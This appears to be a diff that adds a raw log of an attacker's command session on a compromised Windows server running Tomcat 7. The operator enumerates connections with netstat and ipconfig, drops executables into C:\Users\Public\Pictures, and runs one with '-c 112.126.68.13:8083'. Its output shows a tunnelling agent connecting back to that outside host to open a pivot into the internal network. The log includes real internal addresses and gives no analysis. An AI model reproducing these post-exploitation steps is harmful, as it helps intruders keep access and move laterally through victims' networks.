@@ -1,0 +1,358 @@
+C:/Program Files/Apache Software Foundation/Tomcat 7.0/ >netstat -ano
+
+活动连接
+
+  协议  本地地址          外部地址        状态           PID
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       588
+  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       972
+  TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING       1008
+  TCP    0.0.0.0:1030           0.0.0.0:0              LISTENING       684
+  TCP    0.0.0.0:1049           0.0.0.0:0              LISTENING       676
+  TCP    0.0.0.0:1050           0.0.0.0:0              LISTENING       5052
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1760
+  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       1784
+  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       4692
+  TCP    0.0.0.0:9110           0.0.0.0:0              LISTENING       2996
+  TCP    10.0.0.4:139           0.0.0.0:0              LISTENING       4
+  TCP    10.0.0.4:1025          10.0.0.3:3260          ESTABLISHED     4
+  TCP    127.0.0.1:1031         0.0.0.0:0              LISTENING       2848
+  TCP    127.0.0.1:1153         127.0.0.1:16308        ESTABLISHED     5448
+  TCP    127.0.0.1:1156         127.0.0.1:35600        ESTABLISHED     4856
+  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       1760
+  TCP    127.0.0.1:8005         0.0.0.0:0              LISTENING       2996
+  TCP    127.0.0.1:16308        0.0.0.0:0              LISTENING       2848
+  TCP    127.0.0.1:16308        127.0.0.1:1153         ESTABLISHED     2848
+  TCP    127.0.0.1:35600        0.0.0.0:0              LISTENING       2924
+  TCP    127.0.0.1:35600        127.0.0.1:1156         ESTABLISHED     2924
+  TCP    169.254.95.120:139     0.0.0.0:0              LISTENING       4
+  TCP    169.254.95.120:9224    169.254.95.120:1433    TIME_WAIT       0
+  TCP    192.168.0.251:139      0.0.0.0:0              LISTENING       4
+  TCP    192.168.0.251:1036     123.207.106.181:443    ESTABLISHED     2924
+  TCP    192.168.0.251:1106     192.168.0.213:445      ESTABLISHED     4
+  TCP    192.168.0.251:1107     192.168.0.213:445      ESTABLISHED     4
+  TCP    192.168.0.251:1233     192.168.0.213:445      ESTABLISHED     4
+  TCP    192.168.0.251:1602     192.168.254.71:443     CLOSING         10516
+  TCP    192.168.0.251:2753     112.64.200.247:80      ESTABLISHED     12292
+  TCP    192.168.0.251:4123     192.168.255.10:80      LAST_ACK        10516
+  TCP    192.168.0.251:5095     116.62.227.26:443      ESTABLISHED     2848
+  TCP    192.168.0.251:5927     112.64.200.247:80      ESTABLISHED     8532
+  TCP    192.168.0.251:5934     112.64.200.247:80      ESTABLISHED     5012
+  TCP    192.168.0.251:6001     0.0.0.0:0              LISTENING       5396
+  TCP    192.168.0.251:6502     192.168.254.71:443     LAST_ACK        10516
+  TCP    192.168.0.251:7319     192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:7721     192.168.254.71:443     LAST_ACK        10516
+  TCP    192.168.0.251:7937     192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:8600     192.168.0.252:8099     FIN_WAIT_2      10516
+  TCP    192.168.0.251:8722     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:8747     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:8749     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:8750     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:8751     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:9110     103.172.183.204:5769   CLOSE_WAIT      2996
+  TCP    192.168.0.251:9110     103.172.183.204:13665  ESTABLISHED     2996
+  TCP    192.168.0.251:9110     106.120.42.188:34095   TIME_WAIT       0
+  TCP    192.168.0.251:9110     106.120.42.188:54862   ESTABLISHED     2996
+  TCP    192.168.0.251:9309     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:9311     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9312     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:9313     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9314     192.168.255.2:443      ESTABLISHED     8432
+  TCP    192.168.0.251:9315     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9316     192.168.255.2:443      TIME_WAIT       0
+  TCP    192.168.0.251:9317     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9318     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9319     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9320     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9322     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9324     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:9337     101.199.252.49:443     ESTABLISHED     9236
+  TCP    192.168.0.251:9406     142.251.42.234:443     SYN_SENT        6136
+  TCP    192.168.0.251:9410     112.64.200.152:443     ESTABLISHED     11192
+  TCP    192.168.0.251:9422     192.168.0.252:8090     TIME_WAIT       0
+  TCP    192.168.0.251:9487     192.168.255.10:80      CLOSE_WAIT      8432
+  TCP    192.168.0.251:9492     192.168.0.252:8090     CLOSE_WAIT      8432
+  TCP    192.168.0.251:9494     192.168.0.252:8090     CLOSE_WAIT      8432
+  TCP    192.168.0.251:9495     192.168.0.252:8090     CLOSE_WAIT      8432
+  TCP    192.168.0.251:9496     192.168.0.252:8090     CLOSE_WAIT      8432
+  TCP    192.168.0.251:9497     192.168.0.252:8090     ESTABLISHED     8432
+  TCP    192.168.0.251:11564    192.168.0.252:8099     FIN_WAIT_2      10516
+  TCP    192.168.0.251:11627    192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:11746    192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:12954    192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:13320    192.168.254.71:80      LAST_ACK        10516
+  TCP    192.168.0.251:13450    192.168.0.250:6666     FIN_WAIT_2      8432
+  TCP    192.168.0.251:14343    112.64.200.247:80      ESTABLISHED     7732
+  TCP    192.168.0.251:14418    192.168.254.71:443     CLOSING         10516
+  TCP    192.168.0.251:14583    192.168.0.247:6666     FIN_WAIT_2      8432
+  TCP    192.168.0.251:14943    49.234.46.15:65452     ESTABLISHED     8432
+  TCP    [::]:80                [::]:0                 LISTENING       4
+  TCP    [::]:135               [::]:0                 LISTENING       876
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:1026              [::]:0                 LISTENING       588
+  TCP    [::]:1027              [::]:0                 LISTENING       972
+  TCP    [::]:1028              [::]:0                 LISTENING       1008
+  TCP    [::]:1030              [::]:0                 LISTENING       684
+  TCP    [::]:1049              [::]:0                 LISTENING       676
+  TCP    [::]:1050              [::]:0                 LISTENING       5052
+  TCP    [::]:1433              [::]:0                 LISTENING       1760
+  TCP    [::]:2383              [::]:0                 LISTENING       1784
+  TCP    [::]:3389              [::]:0                 LISTENING       4692
+  TCP    [::1]:1434             [::]:0                 LISTENING       1760
+  TCP    [::1]:9229             [::1]:9229             TIME_WAIT       0
+  TCP    [::1]:9489             [::1]:9229             SYN_SENT        7732
+  TCP    [fe80::a1c0:9013:3860:c1ed%15]:135  [fe80::a1c0:9013:3860:c1ed%15]:1209  ESTABLISHED     876
+  TCP    [fe80::a1c0:9013:3860:c1ed%15]:1028  [fe80::a1c0:9013:3860:c1ed%15]:1210  ESTABLISHED     1008
+  TCP    [fe80::a1c0:9013:3860:c1ed%15]:1209  [fe80::a1c0:9013:3860:c1ed%15]:135  ESTABLISHED     6504
+  TCP    [fe80::a1c0:9013:3860:c1ed%15]:1210  [fe80::a1c0:9013:3860:c1ed%15]:1028  ESTABLISHED     6504
+  UDP    0.0.0.0:500            *:*                                    1008
+  UDP    0.0.0.0:4500           *:*                                    1008
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    9372
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    7732
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5353           *:*                                    7044
+  UDP    0.0.0.0:5355           *:*                                    584
+  UDP    0.0.0.0:15133          *:*                                    2848
+  UDP    0.0.0.0:53772          *:*                                    2172
+  UDP    0.0.0.0:54071          *:*                                    7732
+  UDP    0.0.0.0:55773          *:*                                    2848
+  UDP    10.0.0.4:137           *:*                                    4
+  UDP    10.0.0.4:138           *:*                                    4
+  UDP    127.0.0.1:50025        *:*                                    2848
+  UDP    127.0.0.1:50026        *:*                                    2848
+  UDP    127.0.0.1:50027        *:*                                    2848
+  UDP    127.0.0.1:50028        *:*                                    2848
+  UDP    127.0.0.1:50029        *:*                                    2848
+  UDP    127.0.0.1:50030        *:*                                    2848
+  UDP    127.0.0.1:50031        *:*                                    2848
+  UDP    127.0.0.1:50032        *:*                                    2848
+  UDP    127.0.0.1:50033        *:*                                    2848
+  UDP    127.0.0.1:50034        *:*                                    2848
+  UDP    127.0.0.1:50035        *:*                                    2848
+  UDP    127.0.0.1:50036        *:*                                    2848
+  UDP    127.0.0.1:50101        *:*                                    7732
+  UDP    127.0.0.1:50818        *:*                                    2848
+  UDP    127.0.0.1:50819        *:*                                    2848
+  UDP    127.0.0.1:51403        *:*                                    11296
+  UDP    127.0.0.1:52576        *:*                                    2900
+  UDP    127.0.0.1:52577        *:*                                    2900
+  UDP    127.0.0.1:55559        *:*                                    5448
+  UDP    127.0.0.1:55560        *:*                                    5448
+  UDP    127.0.0.1:59665        *:*                                    5448
+  UDP    127.0.0.1:59666        *:*                                    5448
+  UDP    127.0.0.1:61470        *:*                                    2848
+  UDP    127.0.0.1:61471        *:*                                    2848
+  UDP    127.0.0.1:62025        *:*                                    5448
+  UDP    127.0.0.1:62026        *:*                                    5448
+  UDP    127.0.0.1:62712        *:*                                    2848
+  UDP    127.0.0.1:62713        *:*                                    2848
+  UDP    127.0.0.1:63587        *:*                                    5448
+  UDP    127.0.0.1:63588        *:*                                    5448
+  UDP    127.0.0.1:63589        *:*                                    5448
+  UDP    127.0.0.1:63590        *:*                                    5448
+  UDP    127.0.0.1:64358        *:*                                    2848
+  UDP    127.0.0.1:64359        *:*                                    2848
+  UDP    169.254.95.120:137     *:*                                    4
+  UDP    169.254.95.120:138     *:*                                    4
+  UDP    192.168.0.251:137      *:*                                    4
+  UDP    192.168.0.251:138      *:*                                    4
+  UDP    192.168.0.251:5656     *:*                                    2848
+  UDP    192.168.0.251:5657     *:*                                    5448
+  UDP    192.168.0.251:50039    *:*                                    2848
+  UDP    192.168.0.251:65425    *:*                                    5448
+  UDP    [::]:500               *:*                                    1008
+  UDP    [::]:4500              *:*                                    1008
+  UDP    [::]:5353              *:*                                    9372
+  UDP    [::]:5353              *:*                                    7732
+  UDP    [::]:5353              *:*                                    7044
+  UDP    [::]:5353              *:*                                    7044
+  UDP    [::]:5353              *:*                                    7044
+  UDP    [::]:5353              *:*                                    7732
+  UDP    [::]:5353              *:*                                    7732
+  UDP    [::]:5353              *:*                                    9372
+  UDP    [::]:5353              *:*                                    9372
+  UDP    [::]:5355              *:*                                    584
+  UDP    [::1]:51404            *:*                                    11296
+  UDP    [fe80::c146:80fb:ffb5:d7ce%14]:546  *:*                                    972
+C:/Program Files/Apache Software Foundation/Tomcat 7.0/ >
+NULL
+C:/Program Files/Apache Software Foundation/Tomcat 7.0/ >cd /
+
+命令语法不正确。
+C:/Program Files/Apache Software Foundation/Tomcat 7.0/ >cd ../
+
+C:\Program Files\Apache Software Foundation
+C:\Program Files\Apache Software Foundation >cd /
+
+命令语法不正确。
+C:\Program Files\Apache Software Foundation >cd ../../
+
+C:\
+C:\ >cd C:/Users/Public/Pictures/
+
+Cannot run program "C:/Users/Public/Pictures/": CreateProcess error=5, ???·?
+C:\ >cd Users
+
+Cannot run program "C:/Users/Public/Pictures/": CreateProcess error=5, ???·?
+C:\ >dir
+
+Cannot run program "C:/Users/Public/Pictures/": CreateProcess error=5, ???·?
+C:/Program Files/Apache Software Foundation/Tomcat 7.0/ >cd C:/Users/Public/Pictures/
+
+C:\Users\Public\Pictures
+C:\Users\Public\Pictures >dir
+
+驱动器 C 中的卷没有标签。
+ 卷的序列号是 F669-724C
+
+ C:\Users\Public\Pictures 的目录
+
+2024/08/01  08:46    <DIR>          .
+2024/08/01  08:46    <DIR>          ..
+2024/08/01  08:46         4,240,384 a.exe
+2009/07/14  12:57    <DIR>          Sample Pictures
+               1 个文件      4,240,384 字节
+               3 个目录 87,397,957,632 可用字节
+C:\Users\Public\Pictures >a.exe -c 112.126.68.13:8083 -s ttttt
+
+
+C:\Users\Public\Pictures >.exe -c 112.126.68.13:8083 -s tttt
+
+'.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+C:\Users\Public\Pictures >.exe -c 112.126.68.13:8083 -s tttt
+'.exe' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+C:\Users\Public\Pictures >b.exe -c 112.126.68.13:8083 -s tttt
+
+2024/08/01 08:50:32 [*] Starting agent node actively.Connecting to 112.126.68.13:8083
+2024/08/01 08:50:53 [*] Error occured: dial tcp 112.126.68.13:8083: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+C:\Users\Public\Pictures >b.exe -c 112.126.68.13:8083 -s tttt
+
+2024/08/01 08:52:09 [*] Starting agent node actively.Connecting to 112.126.68.13:8083
+2024/08/01 08:52:30 [*] Error occured: dial tcp 112.126.68.13:8083: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond.
+C:\Users\Public\Pictures >b.exe -c 112.126.68.13:8083 -s ttttt
+
+
+C:\Users\Public\Pictures >
+
+NULL
+C:\Users\Public\Pictures >
+
+NULL
+C:\Users\Public\Pictures >ping 10.0.0.1
+
+正在 Ping 10.0.0.1 具有 32 字节的数据:
+来自 10.0.0.4 的回复: 无法访问目标主机。
+请求超时。
+请求超时。
+请求超时。
+
+10.0.0.1 的 Ping 统计信息:
+    数据包: 已发送 = 4，已接收 = 1，丢失 = 3 (75% 丢失)，
+C:\Users\Public\Pictures >tracert baidu.com
+
+
+C:\Users\Public\Pictures >ls
+
+'ls' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+C:\Users\Public\Pictures >dir
+
+驱动器 C 中的卷没有标签。
+ 卷的序列号是 F669-724C
+
+ C:\Users\Public\Pictures 的目录
+
+2024/08/01  08:49    <DIR>          .
+2024/08/01  08:49    <DIR>          ..
+2024/08/01  08:49         1,504,768 b.exe
+2009/07/14  12:57    <DIR>          Sample Pictures
+               1 个文件      1,504,768 字节
+               3 个目录 87,381,901,312 可用字节
+C:\Users\Public\Pictures >ipconfig
+
+Windows IP 配置
+
+
+以太网适配器 本地连接 5:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 本地连接 4:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::a1c0:9013:3860:c1ed%15
+   IPv4 地址 . . . . . . . . . . . . : 10.0.0.4
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+以太网适配器 本地连接 3:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::c146:80fb:ffb5:d7ce%14
+   IPv4 地址 . . . . . . . . . . . . : 192.168.0.251
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   IPv4 地址 . . . . . . . . . . . . : 192.168.1.80
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.0.1
+
+以太网适配器 本地连接 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::39ac:e316:ad0a:1fcc%11
+   IPv4 地址 . . . . . . . . . . . . : 169.254.95.120
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+隧道适配器 isatap.{8838FF60-DF72-42C3-B9F7-E0286C26FBD0}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{713451D1-A9EF-4CBE-B7D9-C7272991A24E}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{219EC556-CAE4-4DA2-B4D2-31CAACE488B2}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{A05CA1A8-5353-4239-A9C6-A78015340CAB}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 isatap.{C52FF7C4-AA7F-4FCE-92F8-D7291E3DBE5A}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+隧道适配器 Teredo Tunneling Pseudo-Interface:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . :
